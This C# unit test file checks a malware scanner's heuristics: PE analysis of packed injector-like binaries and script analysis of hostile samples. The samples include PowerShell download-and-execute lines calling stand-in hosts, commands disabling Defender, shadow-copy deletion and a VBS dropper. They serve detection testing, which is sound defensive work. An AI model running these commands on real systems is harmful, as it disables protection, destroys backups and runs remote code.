using System.Text;
using UScan.Core.Heuristics;
using UScan.Core.Inventory;
using UScan.Core.Model;
using UScan.Core.Scanning;
using UScan.Core.Tests.Support;

namespace UScan.Core.Tests.Unit;

public class HeuristicScorerTests
{
    [Fact]
    public void Single_strong_feature_never_reaches_threshold()
    {
        var r = HeuristicScorer.Score([new HeuristicFeature("x", 100, "very bad")]);
        Assert.False(r.Suspicious);
        Assert.Equal(HeuristicScorer.MaxSingleFeature, r.Score);
    }

    [Fact]
    public void Two_features_above_threshold_are_suspicious_with_reasons()
    {
        var r = HeuristicScorer.Score([new("a", 30, "reason A"), new("b", 35, "reason B")]);
        Assert.True(r.Suspicious);
        Assert.Contains("reason A", r.Explain(), StringComparison.Ordinal);
        Assert.Contains("reason B", r.Explain(), StringComparison.Ordinal);
    }

    [Fact]
    public void Trusted_signature_outweighs_features()
    {
        var r = HeuristicScorer.Score([new("a", 30, "A"), new("b", 35, "B"), new("sig", -50, "signed")]);
        Assert.False(r.Suspicious);
    }

    [Fact]
    public void Duplicate_feature_ids_count_once()
    {
        var r = HeuristicScorer.Score([new("a", 35, "A"), new("a", 35, "A again")]);
        Assert.Equal(35, r.Score);
    }
}

public class PeAnalyzerTests
{
    private sealed class Sig(SignatureStatus s) : ISignatureVerifier
    {
        public SignatureInfo Verify(string path) => new(s, s == SignatureStatus.Valid ? "Contoso" : null, null);
    }

    private static HeuristicResult Analyze(byte[] pe, string name = "C:\\x\\app.exe", SignatureStatus sig = SignatureStatus.NotChecked) =>
        new PeAnalyzer(new Sig(sig)).Analyze(name, new MemoryStream(pe));

    [Fact]
    public void Ordinary_executable_is_not_suspicious()
    {
        var pe = new PeBuilder().Section(".text", PeBuilder.Code).Section(".data", PeBuilder.Data)
            .Imports("CreateFileW", "ReadFile", "WriteFile", "CloseHandle", "ExitProcess", "GetLastError", "HeapAlloc").Build();

        var facts = PeAnalyzer.Extract(new MemoryStream(pe))!;
        Assert.Equal(7, facts.ImportedFunctions.Count);
        Assert.True(facts.EntryPointInExecutableSection);
        Assert.Equal(".text", facts.EntryPointSection);

        var r = Analyze(pe, sig: SignatureStatus.NotSigned);
        Assert.False(r.Suspicious, r.Explain());
    }

    [Fact]
    public void Packed_unsigned_injector_is_suspicious_with_explanations()
    {
        var pe = new PeBuilder()
            .Section("UPX0", PeBuilder.Rwx, PeBuilder.RandomBytes(16 * 1024))
            .Section("UPX1", PeBuilder.Rwx, PeBuilder.RandomBytes(16 * 1024, 2))
            .Imports("LoadLibraryA", "GetProcAddress", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread")
            .Build();

        var r = Analyze(pe, "C:\\Users\\a\\Downloads\\invoice.pdf.exe", SignatureStatus.NotSigned);

        Assert.True(r.Suspicious);
        var ids = r.Features.Select(f => f.Id).ToHashSet();
        Assert.Contains("pe.wx", ids);
        Assert.Contains("pe.packer", ids);
        Assert.Contains("pe.entropy", ids);
        Assert.Contains("pe.dynimports", ids);
        Assert.Contains("pe.injection", ids);
        Assert.Contains("ctx.doubleext", ids);
        Assert.All(r.Features, f => Assert.False(string.IsNullOrWhiteSpace(f.Reason)));
    }

    [Fact]
    public void Same_file_with_trusted_signature_is_not_suspicious()
    {
        var pe = new PeBuilder().Section("UPX0", PeBuilder.Rwx, PeBuilder.RandomBytes(16 * 1024))
            .Imports("VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread").Build();
        Assert.False(Analyze(pe, sig: SignatureStatus.Valid).Suspicious);
    }

    [Fact]
    public void Packing_alone_is_not_suspicious()
    {
        var pe = new PeBuilder().Section("UPX0", PeBuilder.Code, PeBuilder.RandomBytes(16 * 1024)).Section(".rsrc", PeBuilder.Data).Build();
        var r = Analyze(pe, sig: SignatureStatus.NotSigned);
        Assert.False(r.Suspicious, r.Explain());
    }

    [Fact]
    public void Entry_point_in_data_section_is_reported()
    {
        var pe = new PeBuilder().Section(".text", PeBuilder.Code).Section(".data", PeBuilder.Data).EntryIn(1).Build();
        Assert.Contains(Analyze(pe).Features, f => f.Id == "pe.ep");
    }

    [Fact]
    public void Future_timestamp_is_reported()
    {
        var pe = new PeBuilder().Section(".text", PeBuilder.Code).Timestamp(DateTimeOffset.UtcNow.AddYears(3)).Build();
        Assert.Contains(Analyze(pe).Features, f => f.Id == "pe.timestamp");
    }

    [Theory]
    [InlineData(new byte[] { (byte)'M', (byte)'Z' })]
    [InlineData(new byte[] { (byte)'M', (byte)'Z', 0, 0, 0, 0, 0, 0 })]
    public void Malformed_pe_does_not_throw(byte[] data)
    {
        var r = Analyze(data);
        Assert.Contains(r.Features, f => f.Id == "pe.malformed");
        Assert.False(r.Suspicious);
    }

    [Fact]
    public void Random_mutations_never_throw()
    {
        var baseline = new PeBuilder().Section(".text", PeBuilder.Code).Imports("ExitProcess", "GetProcAddress").Build();
        var rng = new Random(42);
        for (var i = 0; i < 2000; i++)
        {
            var m = (byte[])baseline.Clone();
            for (var k = 0; k < 8; k++)
            {
                m[rng.Next(m.Length)] = (byte)rng.Next(256);
            }

            _ = Analyze(m);
        }
    }

    /// <summary>False-positive check on real, legitimate PE files available on every host (.NET runtime assemblies).</summary>
    [Fact]
    public void Runtime_assemblies_are_not_flagged()
    {
        var dir = Path.GetDirectoryName(typeof(object).Assembly.Location)!;
        var files = Directory.GetFiles(dir, "*.dll").Concat(Directory.GetFiles(dir, "*.so")).Take(400).ToArray();
        Assert.True(files.Length > 50);
        var flagged = files.Where(f =>
        {
            using var s = File.OpenRead(f);
            return new PeAnalyzer().Analyze(f, s).Suspicious;
        }).ToArray();
        Assert.Empty(flagged);
    }
}

public class ScriptAnalyzerTests
{
    private static HeuristicResult Analyze(string name, string content) =>
        new ScriptAnalyzer().Analyze(name, new MemoryStream(Encoding.UTF8.GetBytes(content)));

    [Fact]
    public void Download_and_execute_powershell_is_suspicious()
    {
        var r = Analyze("x.ps1", "$c = (New-Object Net.WebClient).DownloadString('http://example.invalid/a'); IEX($c)");
        Assert.True(r.Suspicious, r.Explain());
    }

    [Fact]
    public void Defender_tampering_with_hidden_encoded_launch_is_suspicious()
    {
        var r = Analyze("x.bat", "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\r\npowershell Set-MpPreference -DisableRealtimeMonitoring $true");
        Assert.True(r.Suspicious, r.Explain());
        Assert.Contains(r.Features, f => f.Id == "av.tamper");
    }

    [Fact]
    public void Ransomware_preparation_is_explained()
    {
        var r = Analyze("x.cmd", "vssadmin delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled No\r\nschtasks /create /tn x /tr y");
        Assert.True(r.Suspicious, r.Explain());
        Assert.Contains("shadow copies", r.Explain(), StringComparison.Ordinal);
    }

    [Fact]
    public void Vbs_dropper_is_suspicious()
    {
        var r = Analyze("x.vbs", "Set x = CreateObject(\"MSXML2.XMLHTTP\")\nSet s = CreateObject(\"ADODB.Stream\")\ns.Write x.responseBody\ns.SaveToFile \"a.exe\", 2\nSet sh = CreateObject(\"WScript.Shell\")\nsh.Run \"a.exe\"");
        Assert.True(r.Suspicious, r.Explain());
    }

    [Theory]
    [InlineData("build.ps1", "param($Configuration = 'Release')\ndotnet build -c $Configuration\nif ($LASTEXITCODE -ne 0) { exit 1 }")]
    [InlineData("setup.cmd", "@echo off\r\nset PATH=%PATH%;C:\\tools\r\nxcopy /y src dst\r\n")]
    [InlineData("update.ps1", "Invoke-WebRequest https://example.invalid/tool.zip -OutFile tool.zip\nExpand-Archive tool.zip")]
    [InlineData("a.js", "function add(a, b) { return a + b; }\nconsole.log(add(1, 2));")]
    public void Ordinary_scripts_are_not_suspicious(string name, string content)
    {
        var r = Analyze(name, content);
        Assert.False(r.Suspicious, r.Explain());
    }

    [Fact]
    public void Utf16_scripts_are_decoded()
    {
        var text = "IEX (New-Object Net.WebClient).DownloadString('http://x.invalid'); Add-MpPreference -ExclusionPath C:\\";
        var r = new ScriptAnalyzer().Analyze("x.ps1", new MemoryStream(Encoding.Unicode.GetPreamble().Concat(Encoding.Unicode.GetBytes(text)).ToArray()));
        Assert.True(r.Suspicious, r.Explain());
    }

    [Fact]
    public void Macro_in_docx_is_reported()
    {
        var doc = TestFiles.Zip(("[Content_Types].xml", "<x/>"u8.ToArray()), ("word/vbaProject.bin", new byte[100]));
        var r = new ScriptAnalyzer().Analyze("report.docx", new MemoryStream(doc));
        Assert.Contains(r.Features, f => f.Id == "office.macro");
        Assert.Contains(r.Features, f => f.Id == "office.macro.mismatch");
    }

    [Fact]
    public void Can_analyze_selects_by_extension()
    {
        var a = new ScriptAnalyzer();
        Assert.True(a.CanAnalyze("a.PS1", []));
        Assert.False(a.CanAnalyze("a.txt", []));
        Assert.False(a.CanAnalyze("a.docm", "XXXX"u8));
    }
}

public class HeuristicIntegrationTests
{
    [Fact]
    public async Task Scan_runner_reports_heuristic_as_suspicious_never_infected()
    {
        using var dir = new TempDir();
        dir.Write("dropper.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x.invalid/p'); Set-MpPreference -DisableRealtimeMonitoring $true");
        dir.Write("normal.ps1", "Get-ChildItem | Sort-Object Length");

        var report = await new ScanRunner(new FakeEngine(), new ScanOptions { Heuristics = [new ScriptAnalyzer(), new PeAnalyzer()] })
            .RunAsync([dir.Path], cancellationToken: TestContext.Current.CancellationToken);

        var d = Assert.Single(report.Files, f => f.Path.EndsWith("dropper.ps1", StringComparison.Ordinal));
        Assert.Equal(Verdict.Suspicious, d.Verdict);
        Assert.StartsWith("UScan.Heuristic", d.DetectionName, StringComparison.Ordinal);
        Assert.Contains("Defender", d.Message, StringComparison.Ordinal);
        Assert.Equal(2, d.EngineResults.Count);
        Assert.Equal(Verdict.Clean, Assert.Single(report.Files, f => f.Path.EndsWith("normal.ps1", StringComparison.Ordinal)).Verdict);
    }
}


public class SecondOpinionTests
{
    private sealed class FixedFileEngine(Verdict verdict, string? name) : UScan.Core.Engines.IFileScanEngine
    {
        public int Calls;
        public string Id => "second";

        public Task<EngineResult> ScanFileAsync(string path, CancellationToken cancellationToken)
        {
            Interlocked.Increment(ref Calls);
            return Task.FromResult(new EngineResult(verdict, Id, name, null));
        }
    }

    [Fact]
    public async Task Second_engine_runs_only_for_detections_and_upgrades_heuristic_hits()
    {
        using var dir = new TempDir();
        dir.Write("dropper.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x.invalid/p'); Set-MpPreference -DisableRealtimeMonitoring $true");
        dir.Write("clean.txt", "hello");
        var second = new FixedFileEngine(Verdict.Infected, "Second.Signature");

        var report = await new ScanRunner(new FakeEngine(), new ScanOptions { Heuristics = [new ScriptAnalyzer()], SecondOpinion = second })
            .RunAsync([dir.Path], cancellationToken: TestContext.Current.CancellationToken);

        Assert.Equal(1, second.Calls);
        var d = Assert.Single(report.Files, f => f.Path.EndsWith("dropper.ps1", StringComparison.Ordinal));
        Assert.Equal(Verdict.Infected, d.Verdict);
        Assert.Equal("Second.Signature", d.DetectionName);
        Assert.Equal(3, d.EngineResults.Count);
    }

    [Fact]
    public async Task Clean_second_opinion_never_downgrades_a_signature_detection()
    {
        using var dir = new TempDir();
        dir.Write("eicar.com", TestFiles.Eicar);
        var report = await new ScanRunner(new FakeEngine(), new ScanOptions { SecondOpinion = new FixedFileEngine(Verdict.Clean, null) })
            .RunAsync([dir.Path], cancellationToken: TestContext.Current.CancellationToken);

        var r = Assert.Single(report.Files);
        Assert.Equal(Verdict.Infected, r.Verdict);
        Assert.Equal("Fake.EICAR", r.DetectionName);
        Assert.Contains(r.EngineResults, e => e.EngineId == "second" && e.Verdict == Verdict.Clean);
    }
}
